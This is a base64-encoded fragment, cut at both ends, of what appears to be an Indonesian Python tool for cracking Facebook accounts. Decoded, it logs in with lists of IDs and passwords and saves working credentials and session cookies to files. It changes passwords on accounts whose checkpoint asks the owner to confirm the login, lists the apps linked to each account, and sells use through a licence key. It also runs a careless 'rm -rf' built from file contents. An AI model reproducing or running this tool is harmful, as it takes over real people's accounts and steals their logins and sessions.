XVuID0gaW50KGlucHV0KCdcbiBbJXM/JXNdIG1hc3VrYW4ganVtYmxhaCB0YXJnZXQgOiAnJShNLE4pKSkNCiAgICBleGNlcHQ6bmFueWFfa2V1bj0xDQogICAgcHJpbnQoIiBbJXMqJXNdIEtldGlrICdtZScgamlrYSBpbmdpbiBjcmFjayBkYXJp""IGRhZnRhciB0ZW1hblxuIiUoTyxOKSkNCiAgICBmb3IgbW5oIGluIHJhbmdlKG5hbnlhX2tldW4pOg0KICAgICAgICBtbmggKz0xDQogICAgICAgIHVzZXIgPSBpbnB1dCgnIFslcyolc10gbWFzdWthbiBpZCBhdGF1IHVzZXJuYW1lICVzJXMlcyA6ICclKE8sTixILG1uaCxOKSkNCiAgICAgICAgX21lbWVrXyA9IF9fY29udmVydF9fKHVzZXIpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBhIGluIHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8lcy9mcmllbmRzP2xpbWl0PTUwMDAmYWNjZXNzX3Rva2VuPSVzJyUoX21lbWVrXy5nZXQoJ19rb250b2xfJyksX19wcGtfXykpLmpzb24oKVsiZGF0YSJdOg0KICAgICAgICAgICAgICAgIHVpZCA9IGFbImlkIl0NCiAgICAgICAgICAgICAgICBuYW1hID0gYVsibmFtZSJdDQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVpZCsiPD0+IituYW1hKQ0KICAgICAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICAgICAgcHJpbnQoJ1xuIFvDl10gZ2FnYWwgbWVuZ2FtYmlsIGlkLCBrZW11bmdraW5hbiBpZCB0aWRha2xhaCBwdWJsaWsnKTt0aW1lLnNsZWVwKDMpO21vY2hfeWF5YW4oKQ0KIyBVU0VSTkFNRSBDT05WRVJUIFRPIElEDQpkZWYgX19jb252ZXJ0X18odXNlcik6DQogICAgaWYgdXNlciA9PSAibWUiOg0KICAgICAgICByZXR1cm4geyJfa29udG9sXyI6dXNlcn0NCiAgICBlbHNlOg0KICAgICAgICBwYXlsb2FkID0geyJmYnVybCI6ICJodHRwczovL20uZmFjZWJvb2suY29tL3t9Ii5mb3JtYXQodXNlciksICJjaGVjayI6ICJMb29rdXAifQ0KICAgICAgICBpZiAiZmFjZWJvb2siIGluIHVzZXI6DQogICAgICAgICAgICBwYXlsb2FkID0geyJmYnVybCI6IHVzZXIsICJjaGVjayI6ICJMb29rdXAifQ0KICAgICAgICBtbWsgPSByZXF1ZXN0cy5wb3N0KHVybF9sb29rdXAsIGRhdGE9cGF5bG9hZCkuY29udGVudA0KICAgICAgICB4eHggPSBCZWF1dGlmdWxTb3VwKG1taywgImh0bWwucGFyc2VyIikNCiAgICAgICAgaWR0ID0geHh4LmZpbmQoInNwYW4iLCBpZD0iY29kZSIpDQogICAgICAgIGFzdyA9IGlkdC50ZXh0DQogICAgICAgIHJldHVybiB7Il9rb250b2xfIjphc3d9DQojIENIRUtFUiBBS1VOIENIRUNLUE9JTlQNCmRlZiBnYWJ1dCgpOg0KICAgIGRpcnMgPSBvcy5saXN0ZGlyKCJyZXN1bHRzIikNCiAgICBwcmludCgnXG4gWyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiBkaSBmaWxlIGFuZGEgXVxuJykNCiAgICBmb3IgZmlsZSBpbiBkaXJzOg0KICAgICAgICBwcmludCgiIFslcyslc10gJXMiJShPLEgsZmlsZSkpDQogICAgamFsYW4oZiIgW3tNfcOXe059XSBzZWJlbHVtIG1lbWFzdWthbiBmaWxlLGhpZHVwa2FuIG1vZGUgcGVzYXdhdCAzIGRldGlrLiIpO3RpbWUuc2xlZXAoNSkNCiAgICBmaWxlcyA9IGlucHV0KCJcbiBbJXM/JXNdIG1hc3VrYW4gbmFtYSBmaWxlIDogJXMiJShNLE4sSCkpDQogICAgdHJ5Og0KICAgICAgICBi""dWthX2JhanUgPSBvcGVuKGYncmVzdWx0cy97ZmlsZXN9JywncicpLnJlYWRsaW5lcygpDQogICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgIHByaW50KCdcbiBbIV0gZmlsZSB0aWRhayBhZGEnKTt0aW1lLnNsZWVwKDIpO21vY2hfeWF5YW4oKQ0KICAgIHd3PWlucHV0KGYiXG4ge059W3tPfT97Tn1dIHViYWggcGFzc3dvcmQga2V0aWthIHRhcCB5ZXMgW1kvdF06ICIpDQogICAgaWYgd3cgaW4gKCJZIiwieSIsInlhIik6DQogICAgICAgIHViYWhQLmFwcGVuZCgieSIpDQogICAgICAgIHByaW50KGYiIFt7SH3igKJ7Tn1dIGNvbnRvaCBwYXNzd29yZCA6IHtIfXlheWFueGR7Tn0iKQ0KICAgICAgICBwd0Jhcj1pbnB1dChmIlxuIFt7SH0re059XSBtYXN1a2FuIHBhc3N3b3JkIGJhcnUgOiAiKQ0KICAgICAgICBpZiBsZW4ocHdCYXIpIDw9IDU6DQogICAgICAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10ga2F0YSBzYW5kaSBtaW5pbWFsIDYga2FyYWt0ZXInJShOLE0sTikpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwd0JhcnUuYXBwZW5kKHB3QmFyKQ0KICAgIHByaW50KCclcyBbJXMqJXNdIFRvdGFsICVzJXMlcyBBa3VuJyUoTixPLE4sSyxzdHIobGVuKGJ1a2FfYmFqdSkpLE4pKQ0KICAgIGphbGFuKCIgJXNbJXMjJXNdIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIiUoTixPLE4pKQ0KICAgIGZvciBtZW1layBpbiBidWthX2JhanU6DQogICAgICAgIGtvbnRvbCA9IG1lbWVrLnJlcGxhY2UoJ1xuJywgJycpDQogICAgICAgIHRpdGlkICA9IGtvbnRvbC5zcGxpdCgnfCcpDQogICAgICAgIGphbGFuKGYnIHtOfVt7TX0+e059XSBtZW5jb2JhIGxvZ2luIGtlIGFrdW4gOiB7S317a29udG9sLnJlcGxhY2UoIiBbw5ddICIsICIiKX17Tn0nKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBsb2dfaGFzaWwodGl0aWRbMF0ucmVwbGFjZSgiIFvDl10gIiwgIiIpLCB0aXRpZFsxXSkNCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgcHJpbnQoIiIpDQogICAgcHJpbnQoIiIpDQogICAgcHJpbnQoJyAgIFsgJXNQcm9zZXMgUGVuZ2VjZWthbiBTZWxlc2FpICVzXVxuJyUoSCxOKSkNCiAgICBpbnB1dCgnIFsgJXNLRU1CQUxJJXMgXSAnJShPLEgpKTtvcy5zeXN0ZW0oZiJybSAtcmYge2J1a2FfYmFqdX0iKTttb2NoX3lheWFuKCkNCg0KIyBDSEVLUE9JTlQgREVURURUT1INCmRlZiBsb2dfaGFzaWwodXNlciwgcGFzdyk6DQogICAgZ2xvYmFsIGFtYW4sY3Asc2FsYWgNCiAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQ0KICAgIHNlc3Npb24uaGVhZGVycy51cGRhdGUoew0KICAgICAgICAiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLA0KICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFn""ZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwNCiAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLA0KICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjkiLA0KICAgICAgICAicmVmZXJlciI6Imh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8iLA0KICAgICAgICAidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSINCiAgICB9KQ0KICAgIHNvdXA9QmVhdXRpZnVsU291cChzZXNzaW9uLmdldCh1cmxfbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiKS50ZXh0LCJodG1sLnBhcnNlciIpDQogICAgbGluaz1zb3VwLmZpbmQoImZvcm0iLHsibWV0aG9kIjoicG9zdCJ9KQ0KICAgIGZvciB4IGluIHNvdXAoImlucHV0Iik6DQogICAgICAgIGRhdGEudXBkYXRlKHt4LmdldCgibmFtZSIpOnguZ2V0KCJ2YWx1ZSIpfSkNCiAgICBkYXRhLnVwZGF0ZSh7ImVtYWlsIjp1c2VyLCJwYXNzIjpwYXN3fSkNCiAgICB1cmxQb3N0PXNlc3Npb24ucG9zdCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIitsaW5rLmdldCgiYWN0aW9uIiksZGF0YT1kYXRhKQ0KICAgIHJlc3BvbnNlPUJlYXV0aWZ1bFNvdXAodXJsUG9zdC50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgIGlmICJUZW11a2FuIEFrdW4gQW5kYSIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHVybFBvc3QudGV4dCkpOg0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcciAlc1slcyElc10gSGlkdXBrYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgICAgICAgICAnJShOLE0sTikpLA0KICAgIGlmICJjX3VzZXIiIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICBpZiAiQWt1biBBbmRhIERpa3VuY2kiIGluIHVybFBvc3QudGV4dDoNCiAgICAgICAgICAgIHByaW50KGYiXHIge059W3tNfcOXe059XSBha3VuIHNlc2kgbmV3IikNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQogICAgICAgICAgICBvcGVuKCdyZXN1bHRzL09LRS50eHQnLCAnYScpLndyaXRlKGYiIFvinJNdIHt1c2VyfXx7cGFzd318e2Nva2l9XG4iKQ0KICAgICAgICAgICAgcHJpbnQoZiJcciAg8J+OiXtIfSBob3JlIGFrdW55YSB0aWRhayBjaGVja3BvaW50e059Iik7amFsYW4oZiJcciAge099KntIfSAgdHVuZ2d1IHNlYmVudGFy""IHNlZGFuZyBtZW5nZWNlayBhcGxpa2FzaS4uLntOfSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICAgICAgICAgIGNla19hcGsoc2Vzc2lvbixjb2tpKQ0KICAgIGVsaWYgImNoZWNrcG9pbnQiIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICB0aXRsZT1yZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIocmVzcG9uc2UpKQ0KICAgICAgICBsaW5rMj1yZXNwb25zZS5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdElucHV0PVsnZmJfZHRzZycsJ2phem9lc3QnLCdjaGVja3BvaW50X2RhdGEnLCdzdWJtaXRbQ29udGludWVdJywnbmgnXQ0KICAgICAgICBmb3IgeCBpbiByZXNwb25zZSgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIHguZ2V0KCJuYW1lIikgaW4gbGlzdElucHV0Og0KICAgICAgICAgICAgICAgIGRhdGEyLnVwZGF0ZSh7eC5nZXQoIm5hbWUiKTp4LmdldCgidmFsdWUiKX0pDQogICAgICAgIGFuPXNlc3Npb24ucG9zdCh1cmxfbWIrbGluazIuZ2V0KCJhY3Rpb24iKSxkYXRhPWRhdGEyKQ0KICAgICAgICByZXNwb25zZTI9QmVhdXRpZnVsU291cChhbi50ZXh0LCJodG1sLnBhcnNlciIpDQogICAgICAgIG51bWJlcj0wDQogICAgICAgIGNlaz1bY2VrLnRleHQgZm9yIGNlayBpbiByZXNwb25zZTIuZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICBpZihsZW4oY2VrKT09MCk6DQogICAgICAgICAgICBpZiAiTGloYXQgZGV0YWlsIGxvZ2luIHlhbmcgZGl0YW1waWxrYW4uIEluaSBBbmRhPyIgaW4gdGl0bGU6DQogICAgICAgICAgICAgICAgaWYgInkiIGluIHViYWhQOg0KICAgICAgICAgICAgICAgICAgICBtbWsgPSBwd0JhcnUNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcciAg8J+OiXtIfSBob3JlIGFrdW55YSB0YXAgeWVze059Iik7amFsYW4oZiJcciAge099KntIfSAgdHVuZ2d1IHNlYmVudGFyIHNlZGFuZyBtZW5ndWJhaCBwYXNzd29yZCBkYW4gbWVuZ2VjZWsgYXBsaWthc2kuLi57Tn0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgICAgICAgICAgICAgICAgIHViYWhfcHcoc2Vzc2lvbixyZXNwb25zZSxsaW5rMix1c2VyLCBtbWspDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgbW1rID0gIllheWFuR2FudGVuZzp2Ig0KICAgICAgICAgICAgICAgICAgICBwcmludChmIlxyICDwn46Je0h9IGhvcmUgYWt1bnlhIHRhcCB5ZXN7Tn0iKTtqYWxhbihmIlxyICB7T30qe0h9ICB0dW5nZ3Ugc2ViZW50YXIgc2VkYW5nIG1lbmd1YmFoIHBhc3N3b3JkIGRhbiBtZW5nZWNlayBhcGxpa2FzaS4uLntOfSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICAgICAgICAgICAgICAgICAgdWJhaF9wdyhzZXNzaW9uLHJlc3BvbnNlLGxpbmsyLHVzZXIsIG1taykNCiAgICAgICAgICAgIGVsaWYgIk1hc3Vra2FuIEtvZGUgTWFzdWsgdW50dWsgTWVsYW5qdXRrYW4iIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0""cihyZXNwb25zZSkpOg0KICAgICAgICAgICAgICAgIHByaW50KCcgWyVzISVzXSBvcHNoaCBha3VueWEgdGVycGFzYW5nIGF1dGVudGlrYXNpIGR1YSBmYWt0b3IgOignJShNLE4pKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBvcGVuKCdyZXN1bHRzL0VSUk9SLnR4dCcsICdhJykud3JpdGUoZiIgW8OXXSB7dXNlcn18e3Bhc3d9XG4iKQ0KICAgICAgICAgICAgICAgIHByaW50KGYiIHtOfVt7TX0he059XSBFcnJvciIpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBvcGVuKGYncmVzdWx0cy9DUC1ERVRFS1RPUi17aGF9LXtvcH0te3RhfS50eHQnLCAnYScpLndyaXRlKGYiIFvDl10ge3VzZXJ9fHtwYXN3fVxuIikNCiAgICAgICAgICAgIHByaW50KCIgJXNbJXMqJXNdIFRlcmRhcGF0ICVzIE9wc2kgIiUoTixPLE4sbGVuKGNlaykpKQ0KICAgICAgICBmb3Igb3B0IGluIHJhbmdlKGxlbihjZWspKToNCiAgICAgICAgICAgIHByaW50KGYiIFtceDFiWzE7OTJte3N0cihvcHQrMSl9XHgxYlswbV0gIitjZWtbb3B0XSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmIlxyIHtOfVt7TX0he059XSBLYXRhIHNhbmRpIHNhbGFoIGF0YXUgc3VkYWggZGl1YmFoIikNCiAgICAgICAgb3BlbigncmVzdWx0cy9JTlZBTElELU9LLnR4dCcsICdhJykud3JpdGUoZiIgW8OXXSB7dXNlcn18e3Bhc3d9XG4iKQ0KDQojVUJBSCBQVw0KZGVmIHViYWhfcHcoc2Vzc2lvbixyZXNwb25zZSxsaW5rMix1c2VyLG1tayk6DQogICAgZGF0LGRhdDI9e30se30NCiAgICBidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KICAgIGZvciB4IGluIHJlc3BvbnNlKCJpbnB1dCIpOg0KICAgICAgICBpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCiAgICAgICAgICAgIGRhdC51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KICAgIHViYWhQdz1zZXNzaW9uLnBvc3QodXJsX21iK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCiAgICByZXNVYmFoPUJlYXV0aWZ1bFNvdXAodWJhaFB3LCJodG1sLnBhcnNlciIpDQogICAgbGluazM9cmVzVWJhaC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICBidXQyPVsic3VibWl0W05leHRdIiwibmgiLCJmYl9kdHNnIiwiamF6b2VzdCJdDQogICAgaWYgIkJ1YXQgS2F0YSBTYW5kaSBCYXJ1IiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodWJhaFB3KSk6DQogICAgICAgIGZvciBiIGluIHJlc1ViYWgoImlucHV0Iik6DQogICAgICAgICAgICBpZiBiLmdldCgibmFtZSIpIGluIGJ1dDI6DQogICAgICAgICAgICAgICAgZGF0Mi51cGRhdGUoe2IuZ2V0KCJuYW1lIik6Yi5nZXQoInZhbHVlIil9KQ0KICAgICAgICBkYXQyLnVwZGF0ZSh7InBhc3N3b3JkX25ldyI6IiIuam9pbihtbWspfSkNCiAgICAgICAgYW49c2Vzc2lvbi5wb3N0KHVybF9tYitsaW5rMy5nZXQoImFjdGlv""biIpLGRhdGE9ZGF0MikNCiAgICAgICAgY29raSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCiAgICAgICAgcHJpbnQoZiJcciB7Tn1be0h94pyTe059XSBiZXJoYXNpbCBtZW5ndWJhaCBwYXNzd29yZCBtZW5qYWRpOlxuIHtOfVt7SH3inJN7Tn1de0h9IHt1c2VyfXx7Jycuam9pbihtbWspfXx7Y29raX17Tn0iKQ0KICAgICAgICBvcGVuKCdyZXN1bHRzL1RBQi1ZRVMudHh0JywgJ2EnKS53cml0ZShmIiBb4pyTXSB7dXNlcn18eycnLmpvaW4obW1rKX18e2Nva2l9XG4iKQ0KICAgICAgICBjZWtfYXBrKHNlc3Npb24sY29raSkNCiMgQ0VLIEFQTElLQVNJIFlBTkcgVEVSS0FJVA0KZGVmIGNla19hcGsoc2Vzc2lvbixjb29raWUpOg0KICAgIHc9c2Vzc2lvbi5nZXQoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1hY3RpdmUiLGNvb2tpZXM9eyJjb29raWUiOmNvb2tpZX0pLnRleHQNCiAgICBzb3AgPSBCZWF1dGlmdWxTb3VwKHcsImh0bWwucGFyc2VyIikNCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpDQogICAgZ2FtZSA9IFtpLnRleHQgZm9yIGkgaW4geC5maW5kX2FsbCgiaDMiKV0NCiAgICBpZiBsZW4oZ2FtZSk9PTA6DQogICAgICAgIHByaW50KGYiXG4ge059W3tNfSF7Tn1dIG9wc2hoIHRpZGFrIGFkYSBhcGxpa2FzaSBha3RpZiBkaSBha3VuIGluaS4iKQ0KICAgIGVsc2U6DQogICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6DQogICAgICAgICAgICBwcmludCgiICAgJXMlcy4gJXMlcyIlKEgsaSsxLGdhbWVbaV0ucmVwbGFjZSgiRGl0YW1iYWhrYW4gcGFkYSIsIiBEaXRhbWJhaGthbiBwYWRhIiksTikpDQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb29raWV9KS50ZXh0DQogICAgc29wID0gQmVhdXRpZnVsU291cCh3LCJodG1sLnBhcnNlciIpDQogICAgeCA9IHNvcC5maW5kKCJmb3JtIixtZXRob2Q9InBvc3QiKQ0KICAgIGdhbWUgPSBbaS50ZXh0IGZvciBpIGluIHguZmluZF9hbGwoImgzIildDQogICAgaWYgbGVuKGdhbWUpPT0wOg0KICAgICAgICBwcmludChmIlxuIHtOfVt7TX0he059XSBvcHNoaCB0aWRhayBhZGEgYXBsaWthc2kga2FkYWx1YXJzYSBkaSBha3VuIGluaS4iKQ0KICAgIGVsc2U6DQogICAgICAgIGZvciBpIGluIHJhbmdlKGxlbihnYW1lKSk6DQogICAgICAgICAgICBwcmludCgiICAgJXMlcy4gJXMlcyIlKEssaSsxLGdhbWVbaV0ucmVwbGFjZSgiS2VkYWx1d2Fyc2EiLCIgS2VkYWx1d2Fyc2EiKSxOKSkNCg0KI0NFSyBLRVkNCmRlZiBjZWtfa2V5KCk6DQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgdHJ5Og0KICAgICAgICBvcGVuKCcvZGF0YS9kYXRhL2NvbS50ZXJtdXgv""LmhlbmNldXQudHh0JywgJ3InKS5yZWFkKCkNCiAgICAgICAgamFsYW4oZiJcblt7TX3Dl3tOfV0gb3BzaGggYXNrc2VzIGxvZ2luIGRpIHRvbGFrIGthcmVuYSBhbmRhIHNlYmVsdW1ueWEgc3VkYWggcmVnaXN0ZXIiKTt0aW1lLnNsZWVwKDMpO3JlZ2lzdGVyKCkNCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICBjb2soKQ0KI1JFR0lTVEVSDQpkZWYgcmVnaXN0ZXIoKToNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBqYWxhbihmIlxue059W3tNfcOXe059XSBvcHNoaCBhcGkga2V5IGthbXUgc3VkYWgga2FkYWx1YXJzYSBzaWxhaGthbiB1cGdyYWRlIGtlIHByZW1pdW0hIikNCiAgICB1cGQgPSBpbnB1dChmIlt7Qn0/e059XSBhcGFrYWggaW5naW4gdXBncmFkZSBrZSBwcmVtaXVtIFtZL3RdOiAiKQ0KICAgIGlmIHVwZCA9PSIiOg0KICAgICAgICBwcmludChmIntOfVt7TX3Dl3tOfV0gWS90IG1lbWVrISIpO3RpbWUuc2xlZXAoMik7cmVnaXN0ZXIoKQ0KICAgIGVsaWYgdXBkIGluWyJZIiwieSJdOg0KICAgICAgICBqYWxhbihmIntOfVt7T30+e059XSBBbmRhIGFrYW4gZGkgYWxpaGthbiBrZSB7SH13aGF0c2FwcHtOfS4uLiIpO3RpbWUuc2xlZXAoMC4wMikNCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLysyMzQ4MTEwMDQ0NDE4P3RleHQ9UkFUVStFUlJPUitCRUxJK0xJU0VOU0lOWUErRE9PT05HLi4uLi4uLi4uLi4/Pz8nKTtyZWdpc3RlcigpDQogICAgZWxpZiB1cGQgaW5bIlQiLCJ0Il06DQogICAgICAgIGphbGFuKGYie0J9ID4+IEdvb2QgYnllZTopIik7ZXhpdCgpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZiJ7Tn1be019w5d7Tn1dIFkvdCBtZW1layEiKTt0aW1lLnNsZWVwKDIpO3JlZ2lzdGVyKCkNCg0KI0xPR0lOIEtFWQ0KZGVmIGNvaygpOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KCIlc1sqXSBBRE1JTiBJUyBOT1QgUkVTUE9OU0lCTEUgRk9SIEFCVVNFIE9GIFRISVMgVE9PTFMiJShOKSkNCiAgICBwcmludCgiWypdIE1FU1NBR0UgQURNSU4gRk9SIENPT0tJRSAoJXNLQVJNQSVzKSIlKEgsTikpDQogICAgcHJpbnQoIlsqXSBJRiBZT1UgRE8gTk9UIFVOREVSU1RBTkQgVVNJTkcgVEhFIFRPT0xTLCBQTEVBU0UgQ09OVEFDVCBUSEUgQURNSU4gQlkgVFlwaW5nJyVzQURNSU4lcyciJShILE4pKQ0KICAgIHByaW50KCJbKl0gT1dORVIgS0FSTUEgREFWSUQgJXNUUklBTCVzIFBMRUFTRSBQVVJDSEFTRSBMSU5DRVMgS0VZICglczEgZGF5JXMpIiUoSCxOLEgsTikpDQogICAgcHJpbnQoIlsqXSAoQURNSU4gSVMgTk9UIFJFU1BPTlNJQkxFIEZPUiBBQlVTRSBPRiBUSElTIFRPT0wpIikNCiAgICBwcmludCgiWypdIFNDUklQVCBVUERBVEVEIFsgMTUgRmViIDIwMjJdIikNCiAgICBrZXkgPSBpbnB1dCgiXG5bKl0gbWFzdWthbiBhcGkga2V5IGthbXUgOiAiKQ0KICAgIGlmIGtleSA9PSAnJzoNCiAgICAgICAgcHJpbnQoIlxbIV0gamFuZ2Fu""IGtvc29uZyBicm8iKTt0aW1lLnNsZWVwKDIpO2NvaygpDQogICAgZWxpZiBrZXkgaW5bJ2FkbWluJywnQWRtaW4nLCdBRE1JTiddOg0KICAgICAgICBqYWxhbigiXG4gJXMqICVzTUVTU0FHRSBBRE1JTi4uLiIlKE8sSCkpO3RpbWUuc2xlZXAoMC4wMikNCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLysyMzQ4MTEwMDQ0NDE4P3RleHQ9UkFUVStFUlJPUitCRUxJK0xJU0VOU0lOWUErRE9PT05HLi4uLi4uLi4uLi4/Pz8nKTt0aW1lLnNsZWVwKDIpO2NvaygpDQogICAgZWxpZiBrZXkgaW5bJ3RyaWFsJywnVHJpYWwnLCdUUklBTCddOg0KICAgICAgICBqYWxhbigiXG4gJXMqICVzQW5kYSBha2FuIGRpIGFsaWhrYW4ga2Ugd2Vic2l0ZS4uLiIlKE8sSCkpO3RpbWUuc2xlZXAoMC4wMikNCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLysyMzQ4MTEwMDQ0NDE4Jyk7Y29rKCkNCiAgICB0cnk6DQogICAgICAgIHJlcSA9IHJlcXVlc3RzLmdldChmImh0dHBzOi8vYXBpa2V5LnlheWFueGQubXkuaWQvY2hlY2sucGhwP2tleT17a2V5fSIsIGhlYWRlcnM9eyJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDk7IHZpdm8gMjAwNykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYifSwgdGltZW91dD0xMCkuanNvbigpDQogICAgICAgIGthZGFsdWFyc2EgPSByZXFbJ2V4cGlyZWQnXQ0KICAgICAgICB1c2VyID0gcmVxWyJuYW1hIl0NCiAgICAgICAgb3BlbignL2RhdGEvZGF0YS9jb20udGVybXV4Ly5oZW5jZXV0LnR4dCcsICd3Jykud3JpdGUoa2V5KQ0KICAgICAgICBqYWxhbihmIlxuW3tIfeKAontOfV0gSGFsbG8ge0h9e3VzZXJ9e059IHlvdXIgYXBpa2V5IGlzIHN0aWxsIHZhbGlkIHRpbGwgZGF0ZToge019e2thZGFsdWFyc2F9e059LCBzaWxhaGthbiBndW5ha2FuIGRlbmdhbiBiaWphay4iKTt0aW1lLnNsZWVwKDIpDQogICAgICAgIGV4aXQoIlslcyElc10gcmVydW4gdGhlIGNvbW1hbmQgYnkgdHlwaW5nIHB5dGhvbiBkZW1vbi5weSIlKE0sTikpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBwcmludCgiXG4lc1slcyElc10gYXBpIGtleSAlcyVzJXMgdGlkYWsgdGVyZGFmdGFyIGRpIHdlYnNpdGUiJShOLE0sTixNLGtleSxOKSk7dGltZS5zbGVlcCgyKTtjb2soKQ0KDQojIE1VTEFJIENSQUNLDQpjbGFzcyBfX2NyYWNrX186DQoNCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIHNlbGYuaWQgPSBbXQ0KDQogICAgZGVmIHBsZXJyKHNlbGYsaWQpOg0KICAgICAgICBzZWxmLmlkID0gaWQNCiAgICAgICAgcHJpbnQoJ1xuIFslcyslc10gdG90YWwgaWQgLT4gJXMlcyVzJyAlKE8sTixNLGxlbihzZWxmLmlkKSxOKSkNCiAgICAgICAgX19feWF5YW5nYW50ZW5nX19fID0gaW5wdXQoJyBbJXM/JXNdIGFwYWthaCBhbmRhIGluZ2luIG1lbmdndW5h""a2FuIGthdGEgc2FuZGkgbWFudWFsPyBbWS90XTogJyUoTyxOKSkNCiAgICAgICAgaWYgX19feWF5YW5nYW50ZW5nX19fIGluICgnWScsICd5Jyk6DQogICAgICAgIC